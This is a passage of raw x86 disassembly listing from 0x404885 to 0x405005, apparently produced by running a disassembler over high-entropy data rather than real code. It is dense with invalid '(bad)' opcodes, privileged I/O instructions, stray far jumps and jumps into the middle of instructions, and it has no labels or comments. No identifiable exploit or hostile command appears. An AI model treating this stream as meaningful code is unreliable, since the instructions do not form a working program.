  404885:	sbb    edi,DWORD PTR [ecx]
  404887:	or     eax,0xd964afc0
  40488c:	inc    ecx
  40488d:	xlat   BYTE PTR ds:[ebx]
  40488e:	xchg   edi,eax
  40488f:	ins    DWORD PTR es:[edi],dx
  404890:	adc    ecx,DWORD PTR [edx+0x77b508d0]
  404896:	pop    edx
  404897:	pop    esp
  404898:	repnz dec ecx
  40489a:	jle    0x404880
  40489c:	out    0x6a,eax
  40489e:	xchg   ebx,eax
  40489f:	push   ebp
  4048a0:	inc    ecx
  4048a1:	icebp  
  4048a2:	mov    ds:0x5c0cb036,al
  4048a7:	outs   dx,DWORD PTR ds:[esi]
  4048a8:	fst    st(2)
  4048aa:	cmp    bl,BYTE PTR [ebx-0x7f1b178f]
  4048b0:	xchg   DWORD PTR [eax-0x79],edi
  4048b3:	cmp    esp,edx
  4048b5:	xor    DWORD PTR [ebp+ebp*2-0x172d1846],ebp
  4048bc:	ins    BYTE PTR es:[edi],dx
  4048bd:	ret    
  4048be:	or     ah,BYTE PTR [esi+ebx*1+0x5]
  4048c2:	or     eax,0xcda150ca
  4048c7:	sbb    ebp,DWORD PTR [ebx-0x6d90f1bf]
  4048cd:	outs   dx,BYTE PTR ds:[esi]
  4048ce:	adc    al,0x2d
  4048d0:	and    DWORD PTR [ebx+0x7a890510],ecx
  4048d6:	cmp    BYTE PTR [edi-0x15],ch
  4048d9:	sbb    DWORD PTR [esi+0x62],0x5d
  4048dd:	(bad)  
  4048de:	or     ecx,eax
  4048e0:	xchg   esi,eax
  4048e1:	xor    eax,0x3372a099
  4048e6:	xor    edx,DWORD PTR [ecx+esi*8+0x1e]
  4048ea:	xor    esp,DWORD PTR [eax-0x2e]
  4048ed:	xor    BYTE PTR [ebp-0x7238ed6d],0x8
  4048f4:	and    DWORD PTR [ecx-0xaf3d805],edi
  4048fa:	out    0x7e,al
  4048fc:	fisub  DWORD PTR [edx-0x1c]
  4048ff:	ja     0x404899
  404901:	xchg   DWORD PTR [esi-0x61],esi
  404904:	sbb    eax,0xd8cda0d0
  404909:	enter  0xa328,0x7e
  40490d:	cld    
  40490e:	and    BYTE PTR ds:0x9404f9c9,0xfa
  404915:	sub    eax,0xf38fef4c
  40491a:	push   esp
  40491b:	test   BYTE PTR [esi*8-0x4618a63e],0xb9
  404923:	(bad)  [edi+0x3a]
  404926:	jmp    0x6394e26e
  40492b:	push   ebp
  40492c:	push   ds
  40492d:	hlt    
  40492e:	jl     0x404971
  404930:	and    eax,0xe559f6a
  404935:	or     eax,0x12116f5f
  40493a:	fwait
  40493b:	mov    DWORD PTR [edx+0x60],ecx
  40493e:	ret    0x9b24
  404941:	arpl   WORD PTR [edi+ecx*8+0x39abbcfb],sp
  404948:	std    
  404949:	add    eax,0x4b73cdba
  40494e:	sub    esp,ebp
  404950:	lock ins DWORD PTR es:[edi],dx
  404952:	pop    edi
  404953:	sub    eax,0x7d0e0073
  404958:	mov    al,0x26
  40495a:	push   edx
  40495b:	mov    dh,0x33
  40495d:	rcl    BYTE PTR [ebp+0x1e],0xb
  404961:	add    DWORD PTR [ecx+0x28],0x47
  404965:	xor    ecx,DWORD PTR [eax]
  404967:	je     0x404988
  404969:	xchg   ebp,eax
  40496a:	pop    ds
  40496b:	repnz int3 
  40496d:	(bad)  
  40496f:	mov    ebp,0xd6ea9a09
  404974:	push   ss
  404975:	in     eax,dx
  404976:	xor    BYTE PTR [ebx],bl
  404978:	and    al,0x4d
  40497a:	in     eax,dx
  40497b:	pop    edx
  40497c:	cmp    dh,BYTE PTR [ebx+eax*4-0x2bc4e730]
  404983:	sbb    BYTE PTR [edi-0x2850f666],0x18
  40498a:	pop    ebx
  40498b:	pop    edi
  40498c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40498d:	jmp    0x309e9b78
  404992:	jno    0x4049b5
  404994:	jmp    0x727b:0x32e1ae45
  40499b:	shl    BYTE PTR [ecx+0x6e],1
  40499e:	ret    0xfb78
  4049a1:	xor    al,0xe4
  4049a3:	or     eax,0xa2f58c21
  4049a8:	into   
  4049a9:	cmp    al,0x90
  4049ab:	jg     0x4049c7
  4049ad:	stos   DWORD PTR es:[edi],eax
  4049ae:	xchg   esi,eax
  4049af:	xchg   ebx,eax
  4049b0:	repz ror DWORD PTR [ebp+edx*1+0x66],0x76
  4049b6:	stc    
  4049b7:	mov    edx,0xcfe3f198
  4049bc:	ret    
  4049bd:	jle    0x404948
  4049bf:	icebp  
  4049c0:	sbb    DWORD PTR [esi+0x74],esp
  4049c3:	sbb    eax,0xb21e6934
  4049c8:	iret   
  4049c9:	pop    edx
  4049ca:	jg     0x404a10
  4049cc:	mov    edx,0xb9ab1b8a
  4049d1:	fild   WORD PTR [edi]
  4049d3:	retf   0xd29b
  4049d6:	and    DWORD PTR [esi+0xa],0xffffffa7
  4049da:	rcl    BYTE PTR [esi+0x6c],1
  4049dd:	inc    eax
  4049de:	out    0x73,eax
  4049e0:	lahf   
  4049e1:	fdiv   DWORD PTR [edx]
  4049e3:	add    al,0xd9
  4049e5:	sahf   
  4049e6:	xor    bl,BYTE PTR [edx-0x6d]
  4049e9:	aaa    
  4049ea:	out    dx,al
  4049eb:	dec    ecx
  4049ec:	cdq    
  4049ed:	mov    edi,0x781d2963
  4049f2:	mov    cl,0x72
  4049f4:	push   cs
  4049f5:	aam    0x27
  4049f7:	clc    
  4049f8:	jecxz  0x404a69
  4049fa:	xchg   edx,eax
  4049fb:	pop    ds
  4049fc:	dec    ebp
  4049fd:	cmp    ah,BYTE PTR [edx+0x448e0f2b]
  404a03:	out    0x4c,eax
  404a05:	or     DWORD PTR [edx],ecx
  404a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a08:	inc    edx
  404a09:	call   0xb10bd4e1
  404a0e:	stos   DWORD PTR es:[edi],eax
  404a0f:	ret    
  404a10:	in     eax,dx
  404a11:	outs   dx,DWORD PTR ds:[esi]
  404a12:	popa   
  404a13:	xor    dh,al
  404a15:	sti    
  404a16:	out    dx,eax
  404a17:	out    0x40,al
  404a19:	dec    esp
  404a1a:	stc    
  404a1b:	bound  ecx,QWORD PTR [esp+ebx*2+0x2b12eee1]
  404a22:	pop    ds
  404a23:	icebp  
  404a24:	test   al,0x2a
  404a26:	jb     0x404a15
  404a28:	adc    eax,0xf96c6514
  404a2d:	jmp    0xcfdb:0x52e6813e
  404a34:	push   ds
  404a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a36:	(bad)  
  404a38:	hlt    
  404a39:	in     al,0x9e
  404a3b:	dec    edx
  404a3c:	or     ebx,DWORD PTR [ebp-0x6d26a545]
  404a42:	int3   
  404a43:	jle    0x404a2f
  404a45:	pop    ebp
  404a46:	cmp    edx,DWORD PTR [edx+0x59]
  404a49:	sbb    cl,BYTE PTR [esi+0xb]
  404a4c:	xchg   edx,eax
  404a4d:	jno    0x4049d9
  404a4f:	jnp    0x4049fa
  404a51:	push   ds
  404a52:	outs   dx,DWORD PTR ds:[esi]
  404a53:	out    dx,al
  404a54:	inc    esp
  404a55:	adc    DWORD PTR [edx+0x75],0xffffffc7
  404a59:	je     0x404a32
  404a5b:	and    esi,esp
  404a5d:	sub    eax,0x57efbf98
  404a62:	sbb    cl,BYTE PTR [edx]
  404a64:	xor    al,0xe8
  404a66:	push   eax
  404a67:	pop    eax
  404a69:	mov    esp,0x57f1ccc7
  404a6e:	jne    0x404aab
  404a70:	in     al,dx
  404a71:	ret    0x4772
  404a74:	ins    BYTE PTR es:[edi],dx
  404a75:	fdivrp st(7),st
  404a77:	pop    esp
  404a78:	xchg   edx,eax
  404a79:	mov    DWORD PTR [ecx+0x3d],edx
  404a7c:	cmp    DWORD PTR [edx],edx
  404a7e:	cmp    esp,DWORD PTR [esi-0x36810463]
  404a84:	aaa    
  404a85:	ds ret 0x7653
  404a89:	add    dh,BYTE PTR [ebx]
  404a8b:	iret   
  404a8c:	dec    edx
  404a8d:	pop    esi
  404a8e:	ins    BYTE PTR es:[edi],dx
  404a8f:	arpl   dx,bp
  404a91:	xchg   esp,eax
  404a92:	mov    eax,es:0x99d9a42
  404a98:	cld    
  404a99:	or     BYTE PTR [edx-0x5607c2d8],bh
  404a9f:	adc    esp,DWORD PTR [ebx+0x3db8a681]
  404aa5:	loop   0x404a95
  404aa7:	jle    0x404a8f
  404aa9:	cli    
  404aaa:	pop    ebx
  404aab:	push   ebx
  404aac:	fprem  
  404aae:	sub    ch,ah
  404ab0:	outs   dx,DWORD PTR ds:[esi]
  404ab1:	and    esp,DWORD PTR [esi]
  404ab3:	xchg   edx,eax
  404ab4:	(bad)  
  404ab5:	in     eax,0x6a
  404ab7:	add    BYTE PTR [ecx],al
  404ab9:	das    
  404aba:	or     eax,0x19735927
  404abf:	sub    DWORD PTR [eax+0x463f3f4c],edi
  404ac5:	mov    al,ds:0x7d310539
  404aca:	out    0xe5,al
  404acc:	inc    esi
  404acd:	jp     0x404a59
  404acf:	inc    esi
  404ad0:	outs   dx,BYTE PTR ds:[esi]
  404ad1:	es dec esp
  404ad3:	lds    edx,FWORD PTR [esi+0x278267dd]
  404ad9:	xor    edi,esi
  404adb:	push   esi
  404adc:	arpl   dx,bp
  404ade:	mov    eax,ds:0xaada7817
  404ae3:	mov    bh,0x81
  404ae5:	xor    BYTE PTR [esi+0x575f5944],dh
  404aeb:	daa    
  404aec:	cmp    al,0x54
  404aee:	sub    al,0x9b
  404af0:	jmp    0x404b1a
  404af2:	pop    esp
  404af3:	cmp    eax,0xfa2e928d
  404af8:	ins    BYTE PTR es:[edi],dx
  404af9:	push   edi
  404afa:	iret   
  404afb:	shl    DWORD PTR [eax],1
  404afd:	xor    ebp,DWORD PTR [eax]
  404aff:	leave  
  404b00:	aam    0x59
  404b02:	ret    
  404b03:	mov    eax,ds:0x558c2eba
  404b08:	(bad)  
  404b09:	outs   dx,DWORD PTR ds:[esi]
  404b0a:	test   BYTE PTR [eax],cl
  404b0c:	mov    bl,0x7f
  404b0e:	jg     0x404b6b
  404b10:	xor    edx,DWORD PTR [edi+0x7a5aa66e]
  404b16:	jbe    0x404b6b
  404b18:	jge    0x404b01
  404b1a:	jae    0x404b45
  404b1c:	loopne 0x404aaa
  404b1e:	arpl   WORD PTR [ecx-0x3d],dx
  404b21:	mov    ebx,0x73281c6b
  404b26:	mov    DWORD PTR [edi+ebx*4],0xbd504f0b
  404b2d:	push   ebp
  404b2e:	xchg   esp,eax
  404b2f:	inc    ebp
  404b30:	out    0xe0,eax
  404b32:	mov    dl,0x76
  404b34:	jno    0x404b25
  404b36:	cmc    
  404b37:	dec    ecx
  404b38:	or     bh,BYTE PTR [eax-0x32d88b10]
  404b3e:	xchg   DWORD PTR [edx],ebx
  404b40:	cmc    
  404b41:	pop    ebx
  404b42:	cld    
  404b43:	pop    edi
  404b44:	mov    bl,0xfc
  404b46:	lahf   
  404b47:	cs jno 0x404b61
  404b4a:	pop    ebx
  404b4b:	ja     0x404b2c
  404b4d:	push   esp
  404b4e:	inc    eax
  404b4f:	cld    
  404b50:	push   ebp
  404b51:	add    eax,0x9b2c393c
  404b56:	fist   WORD PTR [ebx+0x6ee1f4aa]
  404b5c:	push   edi
  404b5d:	jge    0x404b57
  404b5f:	jns    0x404b67
  404b61:	or     eax,0x66a0d13b
  404b66:	mov    ecx,0x29ef344e
  404b6b:	ss adc eax,0x328b59bc
  404b71:	outs   dx,DWORD PTR ds:[esi]
  404b72:	mov    WORD PTR ds:0x499f4fb5,gs
  404b78:	imul   ebx,DWORD PTR [eax-0x3b873707],0x3c
  404b7f:	and    dl,al
  404b81:	dec    edi
  404b82:	fwait
  404b83:	xchg   bh,dh
  404b85:	xor    DWORD PTR [esi],eax
  404b87:	jecxz  0x404bba
  404b89:	(bad)  
  404b8a:	mov    esi,0xed25bc3b
  404b8f:	push   0xc
  404b91:	inc    eax
  404b92:	in     eax,dx
  404b93:	out    dx,al
  404b94:	inc    eax
  404b95:	popa   
  404b96:	sub    cl,ah
  404b98:	adc    ebp,DWORD PTR [eax]
  404b9a:	push   edi
  404b9b:	repz test DWORD PTR [esi+edi*4+0x5c95f2b0],0x1e08acf9
  404ba7:	inc    eax
  404ba8:	sahf   
  404ba9:	xchg   BYTE PTR [edi],cl
  404bab:	jb     0x404c29
  404bad:	jle    0x404b4f
  404baf:	sub    BYTE PTR [esi],dh
  404bb1:	mov    edx,0x666a9425
  404bb6:	bound  ecx,QWORD PTR [edi+0x2c]
  404bb9:	push   ss
  404bba:	stos   BYTE PTR es:[edi],al
  404bbb:	daa    
  404bbc:	lahf   
  404bbd:	(bad)  [edx]
  404bbf:	into   
  404bc0:	aad    0xc
  404bc2:	mov    BYTE PTR [ebx+0x76],ch
  404bc5:	into   
  404bc6:	stc    
  404bc7:	push   cs
  404bc8:	std    
  404bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bca:	ins    DWORD PTR es:[edi],dx
  404bcb:	bound  ecx,QWORD PTR [ebx+0x41]
  404bce:	std    
  404bcf:	cdq    
  404bd0:	arpl   sp,bp
  404bd2:	mov    ds:0x3f13b707,al
  404bd7:	es mov cl,0x87
  404bda:	fsub   DWORD PTR [ebp-0x48]
  404bdd:	cmp    BYTE PTR [eax],dl
  404bdf:	jge    0x404c51
  404be1:	cmp    al,0x2c
  404be3:	xchg   ebx,esp
  404be5:	jge    0x404c47
  404be7:	adc    al,0x11
  404be9:	push   eax
  404bea:	arpl   WORD PTR [edx+0x86a3ce9],dx
  404bf0:	gs add eax,0xcd0d7a53
  404bf6:	jle    0x404bcb
  404bf8:	out    dx,al
  404bf9:	(bad)  
  404bfa:	jae    0x404b90
  404bfc:	sbb    ebp,ecx
  404bfe:	gs or  ebx,ebx
  404c01:	pop    ebx
  404c02:	adc    ecx,ebx
  404c04:	mov    ch,0xcf
  404c06:	(bad)  
  404c07:	les    ecx,FWORD PTR [eax]
  404c09:	in     al,dx
  404c0a:	lea    eax,[ecx+0x501595b1]
  404c10:	stc    
  404c11:	imul   ebp,DWORD PTR [ecx+eiz*2],0x75
  404c15:	mov    ds:0x9582a031,al
  404c1a:	mov    dh,0x15
  404c1c:	mov    ecx,0x72ad574f
  404c21:	jo     0x404c65
  404c23:	cdq    
  404c24:	in     al,0x4d
  404c26:	fld    DWORD PTR [esi]
  404c28:	addr16 cwde 
  404c2a:	push   esi
  404c2b:	mov    eax,gs:0xbc7d8bfc
  404c31:	mov    ah,0xde
  404c33:	pop    ebx
  404c34:	(bad)  
  404c36:	sub    ah,BYTE PTR [edx]
  404c38:	or     eax,0xa3d0ffd6
  404c3d:	addr16 push eax
  404c3f:	mov    bl,0xc6
  404c41:	lds    ebx,FWORD PTR [esi-0x58]
  404c44:	jns    0x404c88
  404c46:	out    dx,eax
  404c47:	fwait
  404c48:	xchg   ecx,eax
  404c4a:	cmp    BYTE PTR [ebx+0x4b671a56],ah
  404c50:	ja     0x404c4f
  404c52:	xchg   DWORD PTR [edx+0x2ba3de66],ebx
  404c58:	sbb    DWORD PTR [esp+ebx*4],edi
  404c5b:	enter  0x9b0e,0x4d
  404c5f:	imul   BYTE PTR [edx]
  404c61:	ffreep st(2)
  404c63:	fnstsw WORD PTR [ecx]
  404c65:	lods   eax,DWORD PTR ds:[esi]
  404c66:	and    BYTE PTR [edi-0x63a01c55],0x82
  404c6d:	js     0x404cd5
  404c6f:	add    al,0x75
  404c71:	in     eax,0x9
  404c73:	mov    edx,0x6443dfa2
  404c78:	mov    ds:0x34493266,eax
  404c7d:	cdq    
  404c7e:	push   ds
  404c7f:	xor    dh,BYTE PTR [esi-0x5b224366]
  404c85:	(bad)  
  404c86:	mov    esi,0x64595a12
  404c8b:	sbb    ah,dh
  404c8d:	mov    ah,0x38
  404c8f:	lahf   
  404c90:	pop    edi
  404c91:	mov    edi,0x8ed8d187
  404c96:	loop   0x404c99
  404c98:	fdiv   QWORD PTR [ebx]
  404c9a:	imul   ebp,ecx,0xa526773b
  404ca0:	jmp    0x404ca1
  404ca2:	inc    edi
  404ca3:	push   ebp
  404ca4:	xchg   dl,ah
  404ca6:	sub    DWORD PTR [eax-0x4e523150],0xffffffe4
  404cad:	or     eax,0x4ac9153e
  404cb2:	in     eax,0xdb
  404cb4:	sub    eax,0x9e447295
  404cb9:	mov    esi,0x13142530
  404cbe:	in     eax,dx
  404cbf:	fs test eax,0xa9841f
  404cc5:	aas    
  404cc6:	mov    al,0x7f
  404cc8:	ja     0x404ca5
  404cca:	je     0x404d31
  404ccc:	pop    edi
  404ccd:	dec    BYTE PTR [eax-0x6d]
  404cd0:	push   es
  404cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd2:	xor    DWORD PTR [ecx-0x3],0xcb689154
  404cd9:	or     ecx,esi
  404cdb:	add    eax,DWORD PTR ds:0x7a5df4a
  404ce1:	cld    
  404ce2:	arpl   WORD PTR [eax],sp
  404ce4:	xor    al,0xd5
  404ce6:	sbb    DWORD PTR [edi+0x7c1049ea],ecx
  404cec:	addr16 xchg ebx,eax
  404cee:	sub    ebp,ebp
  404cf0:	sub    eax,0x9fd1ea06
  404cf5:	mov    bl,0xbc
  404cf7:	in     eax,0xa4
  404cf9:	cmc    
  404cfa:	iret   
  404cfb:	or     BYTE PTR [edi],cl
  404cfd:	jb     0x404d7b
  404cff:	push   0x8dedb957
  404d04:	arpl   WORD PTR [edx],cx
  404d06:	mov    dh,0x18
  404d08:	inc    eax
  404d09:	xor    al,0x4c
  404d0b:	popw   ds
  404d0d:	clc    
  404d0e:	pop    eax
  404d0f:	pop    ebp
  404d10:	clc    
  404d11:	mov    ah,0xef
  404d13:	inc    ebx
  404d14:	es repnz and eax,0x25eb5c1a
  404d1b:	fst    DWORD PTR [eax]
  404d1d:	xlat   BYTE PTR ds:[ebx]
  404d1e:	sbb    al,0xe4
  404d20:	out    0x4d,eax
  404d22:	or     dl,BYTE PTR [ebp+0x7bed976]
  404d28:	out    dx,al
  404d29:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d2b:	pop    ss
  404d2c:	call   0xb512f4df
  404d31:	mov    eax,ds:0x1896773
  404d36:	adc    BYTE PTR [ebx-0x3d88f165],0x48
  404d3d:	lea    edi,[esi+eiz*2-0x68]
  404d41:	push   ecx
  404d42:	pushf  
  404d43:	mov    bh,BYTE PTR [eax-0x13]
  404d46:	loopne 0x404cd4
  404d48:	dec    eax
  404d49:	call   0x74b89846
  404d4e:	sub    DWORD PTR ds:0xdb1049a9,edx
  404d54:	repz or eax,0x9e2d19e
  404d5a:	cmp    eax,0x869c84c9
  404d5f:	adc    al,0xad
  404d61:	sbb    ecx,ebp
  404d63:	lds    esi,FWORD PTR [ebx-0x79]
  404d66:	sub    DWORD PTR [ecx+0x3b],edi
  404d69:	mov    ah,0x51
  404d6b:	pop    esp
  404d6c:	mov    dh,0xd3
  404d6e:	rcl    DWORD PTR [eax],1
  404d70:	(bad)  [eax+0x16]
  404d73:	or     eax,0x15dff048
  404d78:	stos   DWORD PTR es:[edi],eax
  404d79:	retf   
  404d7a:	mov    es,WORD PTR ds:0x5449c5e5
  404d80:	fsub   DWORD PTR [edi]
  404d82:	pop    ebx
  404d83:	in     eax,0xde
  404d85:	and    dl,BYTE PTR [esi+0x4759443]
  404d8b:	xchg   esi,eax
  404d8c:	pop    esi
  404d8e:	dec    ecx
  404d8f:	and    al,0xf9
  404d91:	mov    dl,ah
  404d93:	xchg   edx,eax
  404d94:	mov    WORD PTR [esi],?
  404d96:	jge    0x404d9f
  404d98:	cdq    
  404d99:	dec    esi
  404d9a:	stos   BYTE PTR es:[edi],al
  404d9b:	cmc    
  404d9c:	adc    al,0x73
  404d9e:	sub    DWORD PTR [ecx-0x64fe71f0],ebp
  404da4:	ja     0x404e1b
  404da6:	sar    DWORD PTR [ecx-0x32a80b61],0xea
  404dad:	div    esi
  404daf:	inc    ebx
  404db0:	adc    DWORD PTR [esp+edi*8-0x67f465d8],ecx
  404db7:	sbb    ch,BYTE PTR gs:[ebx+edx*4-0x25]
  404dbc:	fucom  st(1)
  404dbe:	pop    es
  404dbf:	test   al,0x5f
  404dc1:	xchg   esp,eax
  404dc2:	pop    ecx
  404dc3:	xchg   ebx,eax
  404dc4:	pop    edi
  404dc5:	push   esp
  404dc6:	sbb    DWORD PTR [eax],0xffffffe9
  404dc9:	test   BYTE PTR [ebx],al
  404dcb:	mov    fs,WORD PTR [eax+0x39b7a431]
  404dd1:	lock retf 0x2b66
  404dd5:	xchg   ebx,eax
  404dd6:	in     eax,0x49
  404dd8:	and    dh,BYTE PTR [ebp-0x7fb314f5]
  404dde:	fisttp QWORD PTR [ecx-0x3b836ef5]
  404de4:	xor    al,0xfc
  404de6:	arpl   WORD PTR [edi+ebx*1+0x5f25432e],dx
  404ded:	mov    ?,ecx
  404def:	cmp    esi,eax
  404df1:	test   eax,0x2dbfe8e2
  404df6:	or     al,0xf8
  404df8:	jbe    0x404dad
  404dfa:	test   eax,ebp
  404dfc:	fidivr DWORD PTR [ecx+eiz*1-0x38]
  404e00:	sbb    BYTE PTR [esi-0x6289e256],cl
  404e06:	popf   
  404e07:	jge    0x404e84
  404e09:	scas   eax,DWORD PTR es:[edi]
  404e0a:	inc    esi
  404e0b:	cmp    al,0xe
  404e0d:	(bad)  
  404e0e:	inc    esp
  404e0f:	arpl   WORD PTR [eax+0x30],bx
  404e12:	shr    BYTE PTR [ebx+ebp*2],0xbb
  404e16:	inc    edx
  404e17:	push   edx
  404e18:	xchg   ebp,eax
  404e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e1b:	mov    ebp,DWORD PTR [eax]
  404e1d:	sahf   
  404e1e:	jl     0x404e3a
  404e20:	sbb    BYTE PTR [edx-0x2f],ah
  404e23:	push   eax
  404e24:	adc    ch,dl
  404e26:	aam    0x50
  404e28:	pop    ss
  404e29:	fucomip st,st(7)
  404e2b:	and    edx,DWORD PTR [ecx]
  404e2d:	adc    al,0x13
  404e2f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  404e31:	cmc    
  404e32:	pop    edx
  404e33:	scas   al,BYTE PTR es:[edi]
  404e34:	sub    eax,0xec61fc0a
  404e39:	imul   ecx,DWORD PTR [edx],0x3e97e9ae
  404e3f:	loop   0x404e2a
  404e41:	out    0x8d,al
  404e43:	repz dec ebx
  404e45:	scas   eax,DWORD PTR es:[edi]
  404e46:	test   BYTE PTR [ebx+0x143c1425],dl
  404e4c:	sbb    edx,ebp
  404e4e:	lock and al,0x81
  404e51:	test   DWORD PTR [ecx+0x5],0xff64f84d
  404e58:	mov    dl,0x19
  404e5a:	shr    DWORD PTR [eax+0x5],cl
  404e5d:	mov    edi,0x8b6d9554
  404e62:	push   es
  404e63:	cmp    ecx,esp
  404e65:	or     eax,0xd74099a3
  404e6a:	jmp    0x404ed3
  404e6c:	inc    esp
  404e6d:	je     0x404ec1
  404e6f:	pop    ebx
  404e70:	por    mm7,QWORD PTR [edx+0x5e]
  404e74:	scas   eax,DWORD PTR es:[edi]
  404e75:	hlt    
  404e76:	imul   esi,edi,0x2286092
  404e7c:	mov    bl,0x4d
  404e7e:	daa    
  404e7f:	push   edx
  404e80:	fs clc 
  404e82:	loopne 0x404e9e
  404e84:	xor    al,0xbb
  404e86:	gs es inc ebx
  404e89:	icebp  
  404e8a:	sbb    ecx,ebp
  404e8c:	mov    cl,0xcd
  404e8e:	cld    
  404e8f:	inc    eax
  404e90:	call   0x3bf1:0x708814fa
  404e97:	addr16 pop eax
  404e99:	and    ah,bl
  404e9b:	mov    gs,esi
  404e9d:	lods   al,BYTE PTR ds:[esi]
  404e9e:	xchg   esp,eax
  404e9f:	loop   0x404f1b
  404ea1:	xchg   ebx,eax
  404ea2:	pop    edi
  404ea3:	dec    eax
  404ea4:	out    0x12,eax
  404ea6:	dec    eax
  404ea7:	jecxz  0x404e49
  404ea9:	inc    DWORD PTR [ecx-0x41]
  404eac:	dec    ebx
  404ead:	mov    bl,0x12
  404eaf:	cmp    bl,0x77
  404eb2:	int    0x34
  404eb4:	lahf   
  404eb5:	(bad)  
  404eb6:	xor    al,0x40
  404eb8:	xchg   DWORD PTR [esi],eax
  404eba:	addr16 mov ebx,?
  404ebd:	and    esp,DWORD PTR [esp+edx*1-0x7dd17f83]
  404ec4:	xchg   DWORD PTR [edx-0x13dd06b4],ebp
  404eca:	test   BYTE PTR [ebp+0xf],cl
  404ecd:	loop   0x404eb0
  404ecf:	xchg   BYTE PTR [ebx],bh
  404ed1:	pop    es
  404ed2:	loope  0x404eb5
  404ed4:	stos   BYTE PTR es:[edi],al
  404ed5:	jmp    0x404e75
  404ed7:	ja     0x404e74
  404ed9:	push   0xffffff9c
  404edb:	test   BYTE PTR ds:0xc9e6abcf,bh
  404ee1:	aaa    
  404ee2:	popf   
  404ee3:	nop
  404ee4:	jb     0x404f42
  404ee6:	jg     0x404f3c
  404ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ee9:	xchg   ecx,eax
  404eea:	idiv   BYTE PTR [edx+ecx*4+0x5801ec7d]
  404ef1:	aas    
  404ef2:	rol    BYTE PTR [ebx],0x8f
  404ef5:	gs push eax
  404ef7:	pop    ecx
  404ef8:	jb     0x404e9b
  404efa:	mov    WORD PTR [ebp+edx*8-0x3a6bacc4],cs
  404f01:	cmp    bl,ah
  404f03:	sbb    eax,0x320447a9
  404f08:	fdiv   DWORD PTR [ecx-0x7246c3b2]
  404f0e:	push   ebx
  404f0f:	inc    esp
  404f10:	mov    ah,0x79
  404f12:	cmp    BYTE PTR [edx],al
  404f14:	sbb    BYTE PTR [ebp+0x6d],dh
  404f17:	loopne 0x404ed0
  404f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f1a:	or     al,0xf
  404f1c:	in     al,0xa3
  404f1e:	lods   al,BYTE PTR ds:[esi]
  404f1f:	or     DWORD PTR [edx+0x45],0x39
  404f23:	in     eax,dx
  404f24:	sub    ch,bh
  404f26:	repnz outs dx,DWORD PTR ds:[si]
  404f29:	arpl   ax,dx
  404f2b:	aas    
  404f2c:	inc    esp
  404f2d:	sub    DWORD PTR [edi+edx*2+0x15],esp
  404f31:	mov    cl,0x45
  404f33:	(bad)  
  404f34:	fbstp  TBYTE PTR [ebx+0x1cd68b22]
  404f3a:	pop    eax
  404f3b:	cmp    eax,0x3decaa8e
  404f40:	test   al,0x2e
  404f42:	mov    esi,0xcc3a3e6c
  404f47:	xchg   edx,eax
  404f48:	dec    ebx
  404f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f4a:	dec    esi
  404f4b:	ins    DWORD PTR es:[edi],dx
  404f4c:	scas   eax,DWORD PTR es:[edi]
  404f4d:	(bad)  
  404f4e:	hlt    
  404f4f:	fwait
  404f50:	push   ss
  404f51:	jno    0x404f6f
  404f53:	mov    ch,0x29
  404f55:	mov    edi,0x572ffef5
  404f5a:	mov    ebx,DWORD PTR [eax]
  404f5c:	shl    BYTE PTR [edi-0x7],1
  404f5f:	scas   eax,DWORD PTR es:[edi]
  404f60:	clc    
  404f61:	test   BYTE PTR [eax],0x40
  404f64:	mov    ch,0x27
  404f66:	mov    DWORD PTR [edx],edx
  404f68:	mov    dh,0x18
  404f6a:	xchg   edx,eax
  404f6b:	imul   ebp,DWORD PTR [eax],0xffffffad
  404f6e:	add    BYTE PTR [ebp+0x17c82fdb],bh
  404f74:	int    0xa5
  404f76:	fisubr WORD PTR [edi-0x16]
  404f79:	or     eax,0x47252521
  404f7e:	adc    eax,0x495f7925
  404f83:	mov    WORD PTR [esi-0x4e],es
  404f86:	add    DWORD PTR [edi+esi*4+0x35783db4],0xffffffc0
  404f8e:	xchg   ecx,esi
  404f90:	adc    al,0xb8
  404f92:	das    
  404f93:	retf   
  404f94:	and    eax,0x6330f424
  404f99:	dec    edi
  404f9a:	push   0xfffffffa
  404f9c:	inc    ebx
  404f9d:	mov    DWORD PTR [edx-0x2fb6cd13],ebx
  404fa3:	and    cl,BYTE PTR [eax]
  404fa5:	cmp    edx,edx
  404fa7:	mov    ah,0xca
  404fa9:	pusha  
  404faa:	sub    dh,bl
  404fac:	ss ds push ss
  404faf:	inc    esp
  404fb0:	in     al,dx
  404fb1:	ds sti 
  404fb3:	in     eax,dx
  404fb4:	inc    edx
  404fb5:	nop
  404fb6:	pop    eax
  404fb7:	leave  
  404fb8:	stos   BYTE PTR es:[edi],al
  404fb9:	sub    ah,BYTE PTR ds:0x557785f9
  404fbf:	mov    eax,0xe06336e0
  404fc4:	adc    eax,0xa34de378
  404fc9:	cs ja  0x405030
  404fcc:	xchg   ecx,eax
  404fcd:	bound  esp,QWORD PTR [ecx]
  404fcf:	cmp    eax,DWORD PTR [esi-0x4b]
  404fd2:	pop    es
  404fd3:	ja     0x405025
  404fd5:	lods   al,BYTE PTR ds:[esi]
  404fd6:	hlt    
  404fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd8:	ret    0xcacf
  404fdb:	mov    dh,0x42
  404fdd:	mov    ds:0x62ee28e8,al
  404fe2:	or     edx,DWORD PTR [ecx+0x3fc66b55]
  404fe8:	cmc    
  404fe9:	jl     0x405064
  404feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fec:	outs   dx,DWORD PTR ds:[esi]
  404fed:	or     eax,0x5563edd1
  404ff2:	inc    eax
  404ff3:	xchg   esp,eax
  404ff4:	test   eax,0x5a5483
  404ff9:	jmp    0x404fab
  404ffb:	enter  0xaeb6,0x1
  404fff:	mov    edx,0xe42002bf
  405004:	lods   eax,DWORD PTR ds:[esi]
  405005:	mov    ah,0xb3
